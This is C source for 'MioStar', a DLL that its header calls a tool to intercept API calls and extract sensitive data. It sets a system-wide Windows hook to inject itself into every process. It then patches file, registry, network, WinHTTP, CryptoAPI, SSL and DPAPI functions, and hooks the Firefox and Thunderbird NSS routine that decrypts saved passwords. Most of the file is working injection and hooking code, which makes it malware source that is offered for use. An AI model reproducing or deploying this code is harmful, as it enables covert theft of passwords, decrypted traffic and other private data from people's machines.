/*
 * Tool name   : MioStar
 * Description : Tool to intercept API calls and to extract sensitive data.
 * Version     : 0.2
 * Date        : 11.17.2010
 * Author      : Ruben Unteregger
 * Web page    : http://www.megapanzer.com
 * Todo        : 
 * Changes     : 11.17.2010 nss3.dll to intercept Firefox, Thunderbird + Seamonkey crypt/decrypt calls
 *
 *
 * License     :
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */



#include <stdio.h>
#include <string.h>
#include <WinSock2.h>
#include <windows.h>
#include <sys/stat.h>
#include <io.h>
#include <sys/locking.h>
#include <Shlwapi.h>

#include "HijackEng/Hooking.h"
#include "MioStar.h"
#include "Kernel32Replacement.h"
#include "SocketReplacement.h"
#include "WinInetReplacement.h"
#include "WinHTTPReplacement.h"
#include "Crypt32Replacement.h"
#include "FileFunctionsReplacement.h"
#include "RegistryReplacement.h"
#include "MozillaFunctionHooks.h"



#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "Ws2_32.lib")


static char *gLoaderName = "DLLInjector";
char gHomeDirectory[MAX_BUF_SIZE + 1];
char gRulesFile[MAX_BUF_SIZE + 1];
char gProcName[MAX_BUF_SIZE + 1];
char *gProcShortPath = NULL;
HANDLE gProcessHook = 0;



byte* CG_FFDecrypt = NULL;
byte* CG_FFEncrypt = NULL;

byte* CG_LoadLibrary = NULL;
byte* CG_LoadLibraryA = NULL;
byte* CG_LoadLibraryW = NULL;
byte* CG_LoadLibraryExA = NULL;
byte* CG_LoadLibraryExW = NULL;
byte* CG_GetModuleHandleA = NULL;
byte* CG_GetModuleHandleW = NULL;
byte* CG_GetModuleHandleExA = NULL;
byte* CG_GetModuleHandleExW = NULL;
byte* CG_GetProcAddress = NULL;
byte* CG_FreeLibrary = NULL;
byte* CG_send = NULL;
byte* CG_WSASend = NULL;
byte* CG_WSPSendTo = NULL;
byte* CG_InetAddr = NULL;
byte* CG_GetHostByName = NULL;
byte* CG_GetAddrInfoA = NULL;
byte* CG_GetAddrInfoW = NULL;
byte* CG_GetAddrInfoExA = NULL;
byte* CG_GetAddrInfoExW = NULL;
byte* CG_WinHttpReadData = NULL;
byte* CG_WinHttpWriteData = NULL;
byte* CG_WinHttpOpenRequest = NULL;
byte* CG_WinHttpConnect = NULL;
byte* CG_InternetConnect = NULL;
byte* CG_HttpOpenRequest = NULL;
byte* CG_FtpOpenFile = NULL;
byte* CG_DecryptFileA = NULL;
byte* CG_DecryptFileW = NULL;
byte* CG_EncryptFileA = NULL;
byte* CG_EncryptFileW = NULL;
byte* CG_CryptEncrypt = NULL;
byte* CG_CryptDecrypt = NULL;
byte* CG_CryptHashData = NULL;
byte* CG_CryptCreateHash = NULL;
byte* CG_BCryptEncrypt = NULL;
byte* CG_BCryptDecrypt = NULL;
byte* CG_BCryptHashData = NULL;
byte* CG_BCryptGenerateSymmetricKey = NULL;
byte* CG_NCryptEncrypt = NULL;
byte* CG_NCryptDecrypt = NULL;
byte* CG_NCryptCreatePersistedKey = NULL;
byte* CG_SslDecryptPacket = NULL;
byte* CG_SslEncryptPacket = NULL;
byte* CG_CPEncrypt = NULL;
byte* CG_CPDecrypt = NULL;
byte* CG_CryptProtectData = NULL;
byte* CG_CryptUnprotectData = NULL;
byte* CG_CryptProtectMemory = NULL;
byte* CG_CryptUnprotectMemory = NULL;
byte* CG_CryptMsgOpenToDecode = NULL;
byte* CG_CryptMsgGetParam = NULL;
byte* CG_CryptMsgUpdate = NULL;
byte* CG_CryptHashMessage = NULL;
byte* CG_CryptDecryptMessage = NULL;
byte* CG_CryptEncryptMessage = NULL;
byte* CG_CreateFileA = NULL;
byte* CG_CreateFileW = NULL;
byte* CG_WriteFile = NULL;
byte* CG_ReadFile = NULL;
byte* CG_RegOpenKeyExA = NULL;
byte* CG_RegOpenKeyExW = NULL;
byte* CG_RegOpenKeyA = NULL;
byte* CG_RegOpenKeyW = NULL;
byte* CG_RegQueryValueExA = NULL;
byte* CG_RegQueryValueW = NULL;
byte* CG_RegQueryValueA = NULL;
byte* CG_RegGetValueA = NULL;
byte* CG_RegGetValueW = NULL;
byte* CG_RegQueryValueExW = NULL;


FARPROC pFFDecrypt = NULL;
FARPROC pFFEncrypt = NULL;

FARPROC pReadFile = NULL;
FARPROC pCreateFileA = NULL;
FARPROC pWriteFile = NULL;
FARPROC pCreateFileW = NULL;
FARPROC pRegOpenKeyExA = NULL;
FARPROC pRegOpenKeyExW = NULL;
FARPROC pRegOpenKeyA = NULL;
FARPROC pRegOpenKeyW = NULL;
FARPROC pRegQueryValueExW = NULL;
FARPROC pRegQueryValueExA = NULL;
FARPROC pRegQueryValueW = NULL;
FARPROC pRegQueryValueA = NULL;
FARPROC pRegGetValueA = NULL;
FARPROC pRegGetValueW = NULL;
FARPROC pSend = NULL;
FARPROC pWSASend = NULL;
FARPROC pWSPSendTo = NULL;
FARPROC pInetAddr = NULL;
FARPROC pGetHostByName = NULL;
FARPROC pGetAddrInfoA = NULL;
FARPROC pGetAddrInfoW = NULL;
FARPROC pGetAddrInfoExA = NULL;
FARPROC pGetAddrInfoExW = NULL;
FARPROC pLoadLibrary = NULL;
FARPROC pLoadLibraryA = NULL;
FARPROC pLoadLibraryW = NULL;
FARPROC pLoadLibraryExA = NULL;
FARPROC pLoadLibraryExW = NULL;
FARPROC pGetModuleHandleA = NULL;
FARPROC pGetModuleHandleW = NULL;
FARPROC pGetModuleHandleExA = NULL;
FARPROC pGetModuleHandleExW = NULL;
FARPROC pGetProcAddress = NULL;
FARPROC pFreeLibrary = NULL;
FARPROC pWinHttpWriteData = NULL;
FARPROC pWinHttpOpenRequest = NULL;
FARPROC pWinHttpConnect = NULL;
FARPROC pCryptEncrypt = NULL;
FARPROC pCryptDecrypt = NULL;
FARPROC pDecryptFileA = NULL;
FARPROC pDecryptFileW = NULL;
FARPROC pEncryptFileA = NULL;
FARPROC pEncryptFileW = NULL;
FARPROC pCryptHashData = NULL;
FARPROC pCryptCreateHash = NULL;
FARPROC pBCryptEncrypt = NULL;
FARPROC pBCryptDecrypt = NULL;
FARPROC pBCryptHashData = NULL;
FARPROC pBCryptGenerateSymmetricKey = NULL;
FARPROC pNCryptEncrypt = NULL;
FARPROC pNCryptDecrypt = NULL;
FARPROC pNCryptCreatePersistedKey = NULL;
FARPROC pSslDecryptPacket = NULL;
FARPROC pSslEncryptPacket = NULL;
FARPROC pCPEncrypt = NULL;
FARPROC pCPDecrypt = NULL;
FARPROC pCryptProtectData = NULL;
FARPROC pCryptUnprotectData = NULL;
FARPROC pCryptProtectMemory = NULL;
FARPROC pCryptUnprotectMemory = NULL;
FARPROC pCryptMsgOpenToDecode = NULL;
FARPROC pCryptMsgGetParam = NULL;
FARPROC pCryptMsgUpdate = NULL;
FARPROC pCryptHashMessage = NULL;
FARPROC pCryptDecryptMessage = NULL;
FARPROC pCryptEncryptMessage = NULL;



FUNCTION_HOOK gLoadFuncs[] = 
{
  {"nss3.dll", "PK11SDR_Decrypt", ":FFDecrypt:", pFFDecrypt, (DWORD) MyFFDecrypt, &CG_FFDecrypt},
  {"nss3.dll", "PK11SDR_Encrypt", ":FFEncrypt:", pFFEncrypt, (DWORD) MyFFEncrypt, &CG_FFEncrypt},
  {NULL, NULL, NULL, NULL, NULL, NULL}
};



FUNCTION_HOOK gFuncRepl[] =
{
  {"Kernel32", "CreateFileA", ":CreateFileA:", pCreateFileA, (DWORD) MyCreateFileA, &CG_CreateFileA},
  {"Kernel32", "CreateFileW", ":CreateFileW:", pCreateFileW, (DWORD) MyCreateFileW, &CG_CreateFileW},
  {"Kernel32", "ReadFile", ":ReadFile:", pReadFile, (DWORD) MyReadFile, &CG_ReadFile},
  {"Kernel32", "WriteFile", ":WriteFile:", pWriteFile, (DWORD) MyWriteFile, &CG_WriteFile},
  {"Advapi32", "RegOpenKeyExA", ":RegOpenKeyExA:", pRegOpenKeyExA, (DWORD) MyRegOpenKeyExA, &CG_RegOpenKeyExA},
  {"Advapi32", "RegOpenKeyExW", ":RegOpenKeyExW:", pRegOpenKeyExW, (DWORD) MyRegOpenKeyExW, &CG_RegOpenKeyExW},
  {"Advapi32", "RegOpenKeyA", ":RegOpenKeyA:", pRegOpenKeyA, (DWORD) MyRegOpenKeyA, &CG_RegOpenKeyA},
  {"Advapi32", "RegOpenKeyW", ":RegOpenKeyW:", pRegOpenKeyW, (DWORD) MyRegOpenKeyW, &CG_RegOpenKeyW},
  {"Advapi32", "RegQueryValueExA", ":RegQueryValueExA:", pRegQueryValueExA, (DWORD) MyRegQueryValueExA, &CG_RegQueryValueExA},
  {"Advapi32", "RegQueryValueExW", ":RegQueryValueExW:", pRegQueryValueExW, (DWORD) MyRegQueryValueExW, &CG_RegQueryValueExW},
  {"Advapi32", "RegQueryValueA", ":RegQueryValueA:", pRegQueryValueA, (DWORD) MyRegQueryValueA, &CG_RegQueryValueA},
  {"Advapi32", "RegQueryValueW", ":RegQueryValueW:", pRegQueryValueW, (DWORD) MyRegQueryValueW, &CG_RegQueryValueW},
  {"Advapi32", "RegGetValueA", ":RegGetValueA:", pRegGetValueA, (DWORD) MyRegGetValueA, &CG_RegGetValueA},
  {"Advapi32", "RegGetValueW", ":RegGetValueW:", pRegGetValueW, (DWORD) MyRegGetValueW, &CG_RegGetValueW},
  {"Ws2_32", "send", ":send:", pSend, (DWORD) MySend, &CG_send},
//RECV!!!!

  {"Ws2_32", "WSASend", ":WSASend:", pWSASend, (DWORD) MyWSASend, &CG_WSASend},
  {"Ws2_32", "WSPSendTo", ":WSPSendTo:", pWSPSendTo, (DWORD) MyWSPSendTo, &CG_WSPSendTo},
  {"Ws2_32", "GetAddrInfoA", ":GetAddrInfoA:", pGetAddrInfoA, (DWORD) MyGetAddrInfoA, &CG_GetAddrInfoA},
  {"Ws2_32", "GetAddrInfoW", ":GetAddrInfoW:", pGetAddrInfoW, (DWORD) MyGetAddrInfoW, &CG_GetAddrInfoW},
  {"Ws2_32", "GetAddrInfoExA", ":GetAddrInfoExA:", pGetAddrInfoExA, (DWORD) MyGetAddrInfoExA, &CG_GetAddrInfoExA},
  {"Ws2_32", "GetAddrInfoExW", ":GetAddrInfoExW:", pGetAddrInfoExW, (DWORD) MyGetAddrInfoExW, &CG_GetAddrInfoExW},
  {"Kernel32", "LoadLibraryA", ":LoadLibraryA:", pLoadLibraryA, (DWORD) MyLoadLibraryA, &CG_LoadLibraryA},
  {"Kernel32", "LoadLibraryW", ":LoadLibraryW:", pLoadLibraryW, (DWORD) MyLoadLibraryW, &CG_LoadLibraryW},
  {"Kernel32", "LoadLibraryExA", ":LoadLibraryExA:", pLoadLibraryExA, (DWORD) MyLoadLibraryExA, &CG_LoadLibraryExA},
  {"Kernel32", "LoadLibraryExW", ":LoadLibraryExW:", pLoadLibraryExW, (DWORD) MyLoadLibraryExW, &CG_LoadLibraryExW},
  {"Kernel32", "GetProcAddress", ":GetProcAddress:", pGetProcAddress, (DWORD) MyGetProcAddress, &CG_GetProcAddress},
  {"Kernel32", "GetModuleHandleExA", ":GetModuleHandleExA:", pGetModuleHandleExA, (DWORD) MyGetModuleHandleExA, &CG_GetModuleHandleExA},
  {"Kernel32", "GetModuleHandleExW", ":GetModuleHandleExW:", pGetModuleHandleExW, (DWORD) MyGetModuleHandleExW, &CG_GetModuleHandleExW},
  {"Kernel32", "GetModuleHandleA", ":GetModuleHandleA:", pGetModuleHandleA, (DWORD) MyGetModuleHandleA, &CG_GetModuleHandleA},
  {"Kernel32", "GetModuleHandleW", ":GetModuleHandleW:", pGetModuleHandleW, (DWORD) MyGetModuleHandleW, &CG_GetModuleHandleW},
  {"Kernel32", "FreeLibrary", ":FreeLibrary:", pFreeLibrary, (DWORD) MyFreeLibrary, &CG_FreeLibrary},
  {"Winhttp", "WinHttpWriteData", ":WinHttpWriteData:", pWinHttpWriteData, (DWORD) MyWinHttpWriteData, &CG_WinHttpWriteData},
  {"Winhttp", "WinHttpOpenRequest", ":WinHttpOpenRequest:", pWinHttpOpenRequest, (DWORD) MyWinHttpOpenRequest, &CG_WinHttpOpenRequest},
  {"Winhttp", "WinHttpConnect", ":WinHttpConnect:", pWinHttpConnect, (DWORD) MyWinHttpConnect, &CG_WinHttpConnect},
  {"Advapi32", "CryptEncrypt", ":CryptEncrypt:", pCryptEncrypt, (DWORD) MyCryptEncrypt, &CG_CryptEncrypt},
  {"Advapi32", "CryptDecrypt", ":CryptDecrypt:", pCryptDecrypt, (DWORD) MyCryptDecrypt, &CG_CryptDecrypt},
  {"Advapi32", "DecryptFileA", ":DecryptFileA:", pDecryptFileA, (DWORD) MyDecryptFileA, &CG_DecryptFileA},
  {"Advapi32", "DecryptFileW", ":DecryptFileW:", pDecryptFileW, (DWORD) MyDecryptFileW, &CG_DecryptFileW},
  {"Advapi32", "EncryptFileA", ":EncryptFileA:", pEncryptFileA, (DWORD) MyEncryptFileA, &CG_EncryptFileA},
  {"Advapi32", "EncryptFileW", ":EncryptFileW:", pEncryptFileW, (DWORD) MyEncryptFileW, &CG_EncryptFileW},
  {"Ncrypt", "NCryptEncrypt", ":NCryptEncrypt:", pNCryptEncrypt, (DWORD) MyNCryptEncrypt, &CG_NCryptEncrypt},
  {"Ncrypt", "NCryptDecrypt", ":NCryptDecrypt:", pNCryptDecrypt, (DWORD) MyNCryptDecrypt, &CG_NCryptDecrypt},
  {"Ncrypt", "NCryptCreatePersistedKey", ":NCryptCreatePersistedKey:", pNCryptCreatePersistedKey, (DWORD) MyNCryptCreatePersistedKey, &CG_NCryptCreatePersistedKey},
  {"Ncrypt", "SslDecryptPacket", ":SslDecryptPacket:", pSslDecryptPacket, (DWORD) MySslDecryptPacket, &CG_SslDecryptPacket},
  {"Ncrypt", "SslEncryptPacket", ":SslEncryptPacket:", pSslEncryptPacket, (DWORD) MySslEncryptPacket, &CG_SslEncryptPacket},
  {"Bcrypt", "BCryptEncrypt", ":BCryptEncrypt:", pBCryptEncrypt, (DWORD) MyBCryptEncrypt, &CG_BCryptEncrypt},
  {"Bcrypt", "BCryptDecrypt", ":BCryptDecrypt:", pBCryptDecrypt, (DWORD) MyBCryptDecrypt, &CG_BCryptDecrypt},
  {"Bcrypt", "BCryptHashData", ":BCryptHashData:", pBCryptHashData, (DWORD) MyBCryptHashData, &CG_BCryptHashData},
  {"Bcrypt", "BCryptGenerateSymmetricKey", ":BCryptGenerateSymmetricKey:", pBCryptGenerateSymmetricKey, (DWORD) MyBCryptGenerateSymmetricKey, &CG_BCryptGenerateSymmetricKey},
  {"Advapi32", "CryptHashData", ":CryptHashData:", pCryptHashData, (DWORD) MyCryptHashData, &CG_CryptHashData},
//  {"Advapi32", "CryptCreateHash", ":CryptCreateHash:", pCryptCreateHash, (DWORD) MyCryptCreateHash, &CG_CryptCreateHash},
  {"RSAEnh", "CPEncrypt", ":CPEncrypt:", pCPEncrypt, (DWORD) MyCPEncrypt, &CG_CPEncrypt},
  {"RSAEnh", "CPDecrypt", ":CPDecrypt:", pCPDecrypt, (DWORD) MyCPDecrypt, &CG_CPDecrypt},
  {"Crypt32", "CryptProtectData", ":CryptProtectData:", pCryptProtectData, (DWORD) MyCryptProtectData, &CG_CryptProtectData},
  {"Crypt32", "CryptUnprotectData", ":CryptUnprotectData:", pCryptUnprotectData, (DWORD) MyCryptUnprotectData, &CG_CryptUnprotectData},
  {"Crypt32", "CryptProtectMemory", ":CryptProtectMemory:", pCryptProtectMemory, (DWORD) MyCryptProtectMemory, &CG_CryptProtectMemory},
  {"Crypt32", "CryptUnprotectMemory", ":CryptUnprotectMemory:", pCryptUnprotectMemory, (DWORD) MyCryptUnprotectMemory, &CG_CryptUnprotectMemory},
//  {"Crypt32", "CryptMsgOpenToDecode", ":CryptMsgOpenToDecode:", pCryptMsgOpenToDecode, (DWORD) MyCryptMsgOpenToDecode, &CG_CryptMsgOpenToDecode},
  {"Crypt32", "CryptMsgGetParam", ":CryptMsgGetParam:", pCryptMsgGetParam, (DWORD) MyCryptMsgGetParam, &CG_CryptMsgGetParam},
  {"Crypt32", "CryptMsgUpdate", ":CryptMsgUpdate:", pCryptMsgUpdate, (DWORD) MyCryptMsgUpdate, &CG_CryptMsgUpdate},
  {"Crypt32", "CryptHashMessage", ":CryptHashMessage:", pCryptHashMessage, (DWORD) MyCryptHashMessage, &CG_CryptHashMessage},
  {"Crypt32", "CryptDecryptMessage", ":CryptDecryptMessage:", pCryptDecryptMessage, (DWORD) MyCryptDecryptMessage, &CG_CryptDecryptMessage},
  {"Crypt32", "CryptEncryptMessage", ":CryptEncryptMessage:", pCryptEncryptMessage, (DWORD) MyCryptEncryptMessage, &CG_CryptEncryptMessage},
  {NULL, NULL, NULL, NULL, NULL, NULL}
};




/*
 * For DLL injection purpose only
 *
 */


LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam) 
{
  return CallNextHookEx((HHOOK) gProcessHook, nCode, wParam, lParam); 
}



/*
 * Load and hijack it
 *
 */

BOOL APIENTRY DllMain(HINSTANCE hModule, DWORD  pLoadReason, LPVOID lpReserved)
{
  FUNCTION_HOOK *lHookPtr = NULL;
  FUNCTION_HOOK *lLoadedFuncsPtr = NULL;
  char lTemp[MAX_BUF_SIZE + 1];
  char lRegValue[MAX_BUF_SIZE + 1];
  HKEY lRegKey = NULL;
  DWORD lValueType = 0;
  DWORD lDataLength = 0;
  HMODULE lNSS3Handle = NULL;



  if(pLoadReason == DLL_PROCESS_ATTACH)
  {
    /*
     * Get Interface functions from the DLL and check its presence
     *
     */

    ZeroMemory(gProcName, sizeof(gProcName));
    GetModuleFileName(NULL, gProcName, MAX_BUF_SIZE);
    gProcShortPath = strrchr(gProcName, '\\') + 1;
    GetShortPathName(gProcName, gProcShortPath, sizeof(gProcShortPath) - 1);



    /*
     * This is the loader. Set the global windows hook!
     *
     */

    if(StrStrI(gProcShortPath, gLoaderName))
    {
      gProcessHook = SetWindowsHookEx(WH_CBT, HookProc, hModule, 0); 


      /*
       * This process is not the loader. Check for hookability.
       *
       */

    } else {

      /*
       *  Find the home directory,
       *
       */

      ZeroMemory(lTemp, sizeof(lTemp));
      ZeroMemory(lRegValue, sizeof(lRegValue));
      ZeroMemory(gRulesFile, sizeof(gRulesFile));
      ZeroMemory(gHomeDirectory, sizeof(gHomeDirectory));
      lDataLength = sizeof(lRegValue);

      if (RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Megapanzer\\MioStar\\", 0, KEY_READ|KEY_SET_VALUE, &lRegKey) == ERROR_SUCCESS)
      {
        if (RegQueryValueEx(lRegKey, "MioStarPath", NULL, &lValueType, (LPBYTE) lRegValue, &lDataLength) == ERROR_SUCCESS)
        {
          strncpy(gHomeDirectory, lRegValue, sizeof(gHomeDirectory));
          snprintf(gRulesFile, sizeof(gRulesFile) - 1, "%s\\RulesFile.txt", gHomeDirectory);
          snprintf(lTemp, sizeof(lTemp) - 1, "DLLMain: Registry value \"MioStarPath\" value is \"%s\".", lRegValue);
        } else {
         snprintf(lTemp, sizeof(lTemp) - 1, "DLLMain: Registry subkey \"MioStarPath\" not found. No hooking is taking place.");
        }
    } else {
      snprintf(lTemp, sizeof(lTemp) - 1, "DLLMain: Registry key \"Software\\Megapanzer\\MioStar\\\" not found. No hooking is taking place.");
    }
         
    RegCloseKey(lRegKey);
    printDebug(lTemp, EVENT_SYSTEM);


      /*
       * Parse the rules and start hooking.
       *
       */

      if (PathFileExists(gRulesFile))
      {
        for (lHookPtr = gFuncRepl; lHookPtr->sDLLName != NULL; lHookPtr++)
          if (ruleExists(gProcShortPath, lHookPtr->sConfFuncName))
            if((lHookPtr->sDLLFuncAddr = GetProcAddress(LoadLibrary(lHookPtr->sDLLName), lHookPtr->sFuncName)) != NULL)
              ForgeHook((DWORD) lHookPtr->sDLLFuncAddr, lHookPtr->sFuncRepl, lHookPtr->sCallGatePtr, lHookPtr->sFuncName);




      /*
       * Load 'n' hook 3rd party DLLs
       *
       */
    
    ZeroMemory(lTemp, sizeof(lTemp));
    snprintf(lTemp, sizeof(lTemp) - 1, "%s\\%s", gHomeDirectory, MIOSTAR_DLL_DIR);

    if (SetDllDirectory(lTemp))
    {
        for (lHookPtr = gLoadFuncs; lHookPtr->sDLLName != NULL; lHookPtr++)
          if (ruleExists(gProcShortPath, lHookPtr->sConfFuncName))
            if((lHookPtr->sDLLFuncAddr = GetProcAddress(LoadLibrary(lHookPtr->sDLLName), lHookPtr->sFuncName)) != NULL)
              ForgeHook((DWORD) lHookPtr->sDLLFuncAddr, lHookPtr->sFuncRepl, lHookPtr->sCallGatePtr, lHookPtr->sFuncName);

    } else {
      ZeroMemory(lTemp, sizeof(lTemp));
      snprintf(lTemp, sizeof(lTemp) - 1, "DLLMain: Can't add \"%s\" to lib path : %d", gHomeDirectory, GetLastError());
      printDebug(lTemp, EVENT_SYSTEM);
    }


	  } else {
        ZeroMemory(lTemp, sizeof(lTemp));
        snprintf(lTemp, sizeof(lTemp) - 1, "DLLMain:%s:No rule file (%s) file found!", gProcShortPath, MIOSTAR_RULES);
        printDebug(lTemp, EVENT_DEFAULT);
      } 
	}
  } else if(pLoadReason == DLL_PROCESS_DETACH) {
  } else if(pLoadReason == DLL_THREAD_ATTACH) {
  } else if(pLoadReason == DLL_THREAD_DETACH) {
  }

  return(TRUE);
}



/*
 *
 *
 */


void printDebug(char *pMsg, DWORD pEventID)
{
  HANDLE hEventLog = INVALID_HANDLE_VALUE;
  LPCSTR pInsertStrings[1] = {NULL};


  if ((hEventLog = RegisterEventSourceA(NULL, "Application")) != INVALID_HANDLE_VALUE)
  {
    pInsertStrings[0] = pMsg;
    ReportEventA(hEventLog, EVENTLOG_INFORMATION_TYPE, 0, pEventID, NULL, 1, 0, (LPCSTR*) pInsertStrings, NULL);
	DeregisterEventSource(hEventLog);
  }
}




/*
 *
 *
 */

BOOL PatchAPI(char *pDLLName, char *pFuncName, FARPROC *pOldFunc, FARPROC pNewFunc)
{
  BOOL    lRetVal = FALSE;
  DWORD   lProtectionVal = 0;
  LPBYTE  lPatchPtr = 0;
  FARPROC pOldFuncPtr = 0;
char lTemp1[MAX_BUF_SIZE + 1];

ZeroMemory(lTemp1, sizeof(lTemp1));
_snprintf(lTemp1, sizeof(lTemp1) - 1, ":%s:", pFuncName);

if (ruleExists(gProcShortPath, lTemp1))
{
  if(pOldFuncPtr = GetProcAddress(LoadLibrary(pDLLName), pFuncName))
  {
    lPatchPtr = (LPBYTE) pOldFuncPtr - 5;
    if(! memcmp(lPatchPtr, "\x90\x90\x90\x90\x90\x8B\xFF", 7))
    {
      if(VirtualProtect(lPatchPtr, 7, PAGE_EXECUTE_READWRITE, &lProtectionVal))
      {
        *lPatchPtr = 0xE9;
        *(LPDWORD) (lPatchPtr + 1) = (DWORD)((LONG) pNewFunc - (LONG) pOldFuncPtr);
        *(LPDWORD) pOldFunc = ((DWORD) pOldFuncPtr + 2);

        InterlockedExchange((LPLONG) pOldFuncPtr, (LONG)((*(LPDWORD) pOldFuncPtr & 0xFFFF0000) | 0xF9EB));
        VirtualProtect(lPatchPtr, 7, lProtectionVal, NULL);
        lRetVal = TRUE;
      }
    }
  }
}

  return(lRetVal);
}



/*
 *
 *
 */

BOOL UnPatchAPI(char *pDLLName, char *pFuncName, FARPROC *pOldFunc)
{
  BOOL lRetVal = FALSE;
  DWORD   lProtectionVal = 0;
  LPBYTE  lPatchPtr = 0;
  FARPROC lOldFuncPtr = 0;


  if(lOldFuncPtr = GetProcAddress(GetModuleHandle(pDLLName), pFuncName))
  {
    lPatchPtr = (LPBYTE) lOldFuncPtr - 5;

    if(VirtualProtect(lPatchPtr, 7, PAGE_EXECUTE_READWRITE, &lProtectionVal))
    {
      InterlockedExchange((LPLONG) lOldFuncPtr, (LONG) ((*(LPDWORD) lOldFuncPtr & 0xFFFF0000) | 0xFF8B));
      memset(lPatchPtr, 0x90, 5);
      VirtualProtect(lPatchPtr, 7, lProtectionVal, NULL);
      *pOldFunc = NULL;
      lRetVal = TRUE;
    }
  }
     
  return(lRetVal);
}



/*
 *
 *
 */

BOOL ruleExists(char *pProcName, char *pFunctionName)
{
  BOOL lRetVal = FALSE;
  FILE *lFH = NULL;
  char lTemp[MAX_BUF_SIZE + 1];

  if (pProcName != NULL && pFunctionName != NULL)
  {
    if ((lFH = fopen(gRulesFile, "r")) != NULL)
    {
      ZeroMemory(lTemp, MAX_BUF_SIZE);

      while (fgets(lTemp, MAX_BUF_SIZE, lFH) != NULL) 
      {
        if (lTemp[0] != '#' && _strnicmp(&lTemp[0], pProcName, strlen(pProcName)) == 0 && StrStrI(lTemp, pFunctionName) != NULL)
        {
          lRetVal = TRUE;
          break;
        }

        ZeroMemory(lTemp, MAX_BUF_SIZE);
      }

      fclose(lFH);
    }
  }

  return(lRetVal);
}



/*
 *
 *
 */

int stringify(void *pInput, DWORD pInputLength, char *pOutput, DWORD pOutputLength)
{
  int lRetVal = 0;
  unsigned char lTmpInt = 0;
  char lTemp[16];
  char *mTmpPtr = NULL;


  mTmpPtr = (char *) pInput;

  for (lRetVal = 0; lRetVal < pInputLength && lRetVal < pOutputLength; lRetVal++)
  {
    ZeroMemory(lTemp, sizeof(lTemp));
    lTmpInt = mTmpPtr[lRetVal];

    if (lTmpInt > 31 && lTmpInt < 127)
      pOutput[lRetVal] = lTmpInt;
    else
      pOutput[lRetVal] = '.';
  }

  return(lRetVal);
}



/*
 *
 *
 */

char *stringify2(void *pInput, DWORD pInputLength)
{
  char *lRetVal = 0;
  int lMaxSize = 2 * pInputLength;
  int lCounter = 0;
  unsigned char lTmpInt = 0;
  char lTemp[16];
  char *lTmpPtr = NULL;




  if (pInput != NULL && pInputLength > 0 && (lRetVal = (char *) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pInputLength * 2)) != NULL)
  {
    lTmpPtr = (char *) pInput;

    for (lCounter = 0; lMaxSize < pInputLength; lCounter++)
    {

      lTmpInt = lTmpPtr[lCounter];

      if (lTmpInt > 31 && lTmpInt < 127)
        lRetVal[lCounter] = lTmpInt;
      else
        lRetVal[lCounter] = '.';
    }
  }

  return(lRetVal);
}


